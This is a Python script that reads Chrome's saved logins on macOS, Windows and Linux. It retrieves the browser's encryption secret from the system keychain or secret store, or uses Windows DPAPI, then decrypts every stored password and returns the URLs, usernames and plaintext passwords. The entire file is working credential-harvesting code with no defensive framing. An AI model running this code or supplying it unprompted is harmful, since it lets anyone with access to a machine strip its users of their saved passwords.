import platform
import string
import subprocess
import secretstorage
import sqlite3
from os import path
from json import dumps
from Crypto.Cipher import AES 
from getpass import getuser
from importlib import import_module
from os import unlink
from shutil import copy




class ChromeMac:
    def __init__(self):
 
        my_pass = subprocess.Popen(
            "security find-generic-password -wa 'Chrome'",
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            shell=True)
        stdout, _ = my_pass.communicate()
        my_pass = stdout.replace(b'\n', b'')

        iterations = 1003
        salt = b'saltysalt'
        length = 16

        kdf = import_module('Crypto.Protocol.KDF')
        self.key = kdf.PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = (f"/Users/{getuser()}/Library/Application Support/"
                       "Google/Chrome/Default/")

    def decrypt_func(self, enc_passwd):
        aes = import_module('Crypto.Cipher.AES')
        initialization_vector = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')


class ChromeWin:
    def __init__(self):
        win_path = f"C:\\Users\\{getuser()}\\AppData\\Local\\Google" "\\{chrome}\\User Data\\Default\\"
        win_chrome_ver = [
            item for item in
            ['chrome', 'chrome dev', 'chrome beta', 'chrome canary']
            if path.exists(win_path.format(chrome=item))
        ]
        self.dbpath = win_path.format(chrome=''.join(win_chrome_ver))

    def decrypt_func(self, enc_passwd):
        win32crypt = import_module('win32crypt')
        data = win32crypt.CryptUnprotectData(enc_passwd, None, None, None, 0)
        return data[1].decode('utf8')


class ChromeLinux:
    def __init__(self):
        my_pass = 'peanuts'.encode('utf8')
        bus = secretstorage.dbus_init()
        collection = secretstorage.get_default_collection(bus)
        for item in collection.get_all_items():
            if item.get_label() == 'Chrome Safe Storage':
                my_pass = item.get_secret()
                break
        iterations = 1
        salt = b'saltysalt'
        length = 16

        kdf = import_module('Crypto.Protocol.KDF')
        self.key = kdf.PBKDF2(my_pass, salt, length, iterations)
        self.dbpath = f"/home/{getuser()}/.config/google-chrome/Default/"

    def decrypt_func(self, enc_passwd):
        aes = import_module('Crypto.Cipher.AES')
        initialization_vector = b' ' * 16
        enc_passwd = enc_passwd[3:]
        cipher = aes.new(self.key, aes.MODE_CBC, IV=initialization_vector)
        decrypted = cipher.decrypt(enc_passwd)
        return decrypted.strip().decode('utf8')


class Chrome:
    def __init__(self):
        target_os = platform.system()
        if target_os == 'Darwin':
            self.chrome_os = ChromeMac()
        elif target_os == 'Windows':
            self.chrome_os = ChromeWin()
        elif target_os == 'Linux':
            self.chrome_os = ChromeLinux()

    @property
    def get_login_db(self):
        return self.chrome_os.dbpath

    def get_password(self, prettyprint=False):

        copy(self.chrome_os.dbpath + "Login Data", "Login Data.db")
        conn = sqlite3.connect("Login Data.db")
        cursor = conn.cursor()
        cursor.execute("""
            SELECT origin_url, username_value, password_value
            FROM logins; """)
        data = {'data': []}
        for result in cursor.fetchall():
            _passwd = self.chrome_os.decrypt_func(result[2])
            passwd = ''.join(i for i in _passwd if i in string.printable)
            if result[1] or passwd:
                _data = {}
                _data['url'] = result[0]
                _data['username'] = result[1]
                _data['password'] = passwd
                data['data'].append(_data)
        conn.close()
        unlink("Login Data.db")

        if prettyprint:
            return dumps(data, indent=4)
        return data




def dict_data():
    chrome_pwd = Chrome()
    dictdata = chrome_pwd.get_password()

    data = {'data': []}
    for d in dictdata['data']:
        data['data'].append(
            {
            'URL': d['url'], 
            'Username': d['username'],
            'Password': d['password']
            }
        )
    return data

